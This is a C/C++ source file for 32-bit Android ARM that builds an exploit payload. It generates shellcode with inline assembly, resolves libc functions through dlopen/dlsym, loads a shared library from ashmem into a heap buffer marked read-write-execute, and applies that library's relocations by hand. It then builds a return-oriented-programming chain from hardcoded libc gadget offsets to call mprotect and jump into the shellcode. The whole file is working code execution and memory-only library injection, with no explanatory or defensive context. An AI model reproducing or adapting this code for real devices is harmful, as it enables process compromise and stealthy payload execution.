#include<stdio.h>
#include<stdlib.h>
#include<dlfcn.h>
#include<string.h>
#include<unistd.h>
#include <sys/types.h>          /* See NOTES */
#include <sys/un.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/signal.h>
#include <cutils/ashmem.h>
#include <cutils/ashmem.h>
typedef void (*noargfun_t)();
typedef void (*so_start_t)(int fd0,int fd1);

extern unsigned int getOffset(const char *moduleName,const char *funcName);
extern void *getProcAddr(const char *moduleName,const char *funcName);
void *getModuleBase(const char *moduleName);
extern "C" void asmm_test(uint32_t);
typedef void *(*dlopen_t)(const char *filename, int flag);
typedef void *(*dlsym_t)(void *handle, const char *symbol);
typedef int (*printf_t)(const char *format, ...);
typedef int (*__android_log_print_t)(int prio, const char *tag, const char *fmt, ...);
typedef int (* execl_t)(const char *path, const char *arg, ...);
typedef int (*socket_t)(int domain, int type, int protocol);
typedef int (*bind_t)(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
typedef int (*listen_t)(int sockfd, int backlog);
typedef int (*accept_t)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
typedef ssize_t (*read_t)(int fd, void *buf, size_t count);
typedef int (*close_t)(int fd);
typedef char *(*strcpy_t)(char *dest, const char *src);
typedef int (*chmod_t)(const char *path, mode_t mode);
typedef int (*unlink_t)(const char *pathname);
typedef void *(*mmap_t)(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
typedef int (*ashmem_pin_region_t)(int fd, size_t offset, size_t len);
typedef int (*ashmem_unpin_region_t)(int fd, size_t offset, size_t len);
typedef int (*ashmem_get_size_region_t)(int fd);
typedef int (*mprotect_t)(void *addr, size_t len, int prot);
typedef void *(*malloc_t)(size_t size);
typedef void *(*memcpy_t)(void *dest, const void *src, size_t n);

__attribute__((always_inline)) void *run_code(char *code,dlopen_t dlopen_f);
void *get_so_buffer(const char *so_name);
#define printf(...)
//let gcc help us generate shellcode, less asm, hard code dlsym
void shellcode(dlopen_t dlopen_f,void *pos){
    char *str_array = NULL;
    //construct string table in function
    asm __volatile__ ("mov %[result],pc":[result]"=r" (str_array));
    asm __volatile__ ("b .L_strlen_start");
    asm __volatile__ (".align 1");
    asm __volatile__ (".asciz \"printf\"");
    asm __volatile__ (".asciz \"__android_log_print\"");
    asm __volatile__ (".asciz \"mmap\"");
    asm __volatile__ (".asciz \"ashmem_pin_region\"");
    asm __volatile__ (".asciz \"ashmem_unpin_region\"");
    asm __volatile__ (".asciz \"ashmem_get_size_region\"");
    asm __volatile__ (".asciz \"mprotect\"");
    asm __volatile__ (".asciz \"malloc\"");
    asm __volatile__ (".asciz \"memcpy\"");
    asm __volatile__ (".asciz \"fd is %d, %x,%s\\n\"");
    asm __volatile__ (".asciz \"\xff\"");
    asm __volatile__ (".align 1");
    asm __volatile__ (".L_strlen_start:");
    //printf("start exec shellcode\n");
    char *fun_array[50];
    char *p = str_array;
    for(int i=0;i<50;i++){
        if(*p==0xff)
            break;
        fun_array[i]=p;
        while(*p++!=0);
    }
    if((int)dlopen_f%2==0)
        dlopen_f = (dlopen_t)((int)(dlopen_f)+1);
    dlsym_t dlsym_f = (dlsym_t)((int)dlopen_f+8);
    void *handle = dlopen_f(NULL,RTLD_NOW);

    int f = 0;
    printf_t printf_f = (printf_t)dlsym_f(handle,fun_array[f++]);
    #define getaddr(func_name) func_name##_t func_name##_f = (func_name##_t)dlsym_f(handle,fun_array[f++])
    getaddr(__android_log_print);
    getaddr(mmap);
    getaddr(ashmem_pin_region);
    getaddr(ashmem_unpin_region);
    getaddr(ashmem_get_size_region);
    getaddr(mprotect);
    getaddr(malloc);
    getaddr(memcpy);
    int s=9;
    int fd_memory = *(int*)(int(pos)+12);
    int pipe_from_client = *(int*)(int(pos)+16);
    int pipe_to_client = *(int*)(int(pos)+20);
    ashmem_pin_region_f(fd_memory, 0, 0);
    int ashem_size=ashmem_get_size_region_f(fd_memory);
    uint8_t *shm = (uint8_t*)mmap_f(NULL, ashem_size, PROT_READ, MAP_SHARED, fd_memory, 0);
    //ashmem_unpin_region_f(fd_memory, 0, 0);
    //can't mprotect ashmem as read and write, copy it to heap
    char *code = (char*)malloc_f(ashem_size);
    memcpy_f(code, shm, ashem_size);
    mprotect_f((void*)((uint32_t)code&0xfffff000), ashem_size, PROT_READ|PROT_WRITE|PROT_EXEC);
    //printf("start exec load so from memory\n");
    printf_f(fun_array[s],fd_memory,(char*)code,fun_array[s-2]);
    __android_log_print_f(3,fun_array[0],fun_array[s],fd_memory,code,fun_array[s-2]);
    so_start_t so_start = (so_start_t)run_code((char*)code,dlopen_f);
    //mprotect_f((void*)((uint32_t)code&0xfffff000), ashem_size, PROT_READ|PROT_EXEC);
    so_start(pipe_from_client,pipe_to_client);
}
__attribute__((always_inline)) void *run_code(char *code,dlopen_t dlopen_f){

    /*code layout
     * 0->4 len
     * 4->8 so_start offset
     * 8->len+8 relocation info
     * rest real so
     */
    if((int)dlopen_f%2==0)
        dlopen_f = (dlopen_t)((int)(dlopen_f)+1);
    dlsym_t dlsym_f = (dlsym_t)((int)dlopen_f+8);
    void *self = dlopen_f(NULL,RTLD_NOW);
    char *pos=code+8;
    const uint32_t len = 4096*5;
    char *received_code = code+len+8;
    uint32_t start_offset = *(int*)(code+4);
    printf("offset is %d\n",start_offset);
    so_start_t so_start = (so_start_t)(received_code+start_offset);
    while(*(uint32_t *)pos!=0xcccccccc){
        int offset = *(int*)(pos);
        pos+=4;
        int va = *(int*)(pos);
        pos+=4;
        char *name = pos;
        while(*pos++!=0);
        //pos+=strlen(name)+1;
        if(va==0){//adjust imported function
            void *p = dlsym_f(self,name);
            *(void**)((char*)received_code+offset) = p;
        }else{//adjust global variable and function
            *(void**)((char*)received_code+offset) = (received_code+va);
        }
        //printf("%s at offset %p,%p\n",name,*(void**)((char*)received_code+offset),dlsym(self,name));
    }
    pos+=4;
    if(*(uint32_t *)pos!=0xcccccccc){
        uint32_t *reldataro_va = (uint32_t*)(received_code+*(uint32_t *)pos);
        pos+=4;
        for(uint32_t x=0;*(uint32_t *)pos!=0xcccccccc;x++){
            int dataro_offset=*(int*)pos; 
            if(dataro_offset!=0){
                reldataro_va[x]=(uint32_t)(received_code+dataro_offset);
                printf("relocated dataro %p\n",(void*)reldataro_va[x]);
            }
            pos+=4;
        }
    }
    pos+=4;
    //asm ("bkpt #1");
    while(*(uint32_t *)pos!=0xcccccccc){
        int rva = *(int*)pos;
        if(rva!=0&&rva!=-1){
            noargfun_t init = (noargfun_t)(received_code+rva);
            //printf("call init %p\n",init);
            init();
        }
        pos+=4;
    }
    //asm ("bkpt #25");
    return (void*)so_start;
    //so_start();
}
#undef printf
void *get_shellcode(uint32_t *len){
    uint32_t shellcode_len = (uint32_t)&get_shellcode-(uint32_t)&shellcode;
    printf("shellcode len is %d\n",shellcode_len);
    *len = shellcode_len;
    char *buffer=(char*)malloc(shellcode_len);
    memcpy(buffer,(void*)((int)&shellcode-1),shellcode_len);
    return buffer;
}

void *get_so_buffer(const char *so_name);
void shell_main(){

    dlopen_t dlopen_f = (dlopen_t)getProcAddr(NULL,"dlopen");
    dlsym_t dlsym_f = (dlsym_t)getProcAddr(NULL,"dlsym");

    const char *so_name = "/data/local/tmp/testso.so";
    char *code = (char*)get_so_buffer(so_name); 
    int ashmem_len = *(int*)code;
    int fd_memory = ashmem_create_region("shmem", ashmem_len);
    ashmem_pin_region(fd_memory, 0, 0);
    uint8_t *shm = (uint8_t*)mmap(NULL, ashmem_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_memory, 0);
    printf("first map address is %p\n",shm);
    memcpy(shm,code,ashmem_len);
    free(code);
    //ashmem_unpin_region(fd_memory, 0, 0);

    int pos[32]={12,2,12,fd_memory};
    //shellcode(dlopen_f,pos);
    uint32_t libcbase = (uint32_t)getModuleBase("libc.so");
    uint32_t mprotect_address = (uint32_t)getProcAddr("libc.so","mprotect");
    uint32_t len = 0;
    void *buffer = get_shellcode(&len);
    uint32_t ropData[29]={libcbase+0x15056+1,1+libcbase+0x4c8ee,0xdeaddead,0xdeaddead,(uint32_t)buffer&0xfffff000,4096,0x7,(uint32_t)mprotect_address,(uint32_t)dlopen_f,(uint32_t)pos,2,(uint32_t)buffer+1};
    //uint32_t ropData[29]={libcbase+0x15056+1,1+libcbase+0x4c8ee,0xdeaddead,0xdeaddead,(uint32_t)buffer&0xfffff000,4096,0x7,(uint32_t)mprotect_address,(uint32_t)dlopen_f,1,2,(uint32_t)shellcode};
    asmm_test((uint32_t)ropData);
    free(buffer);
    exit(-1);
}
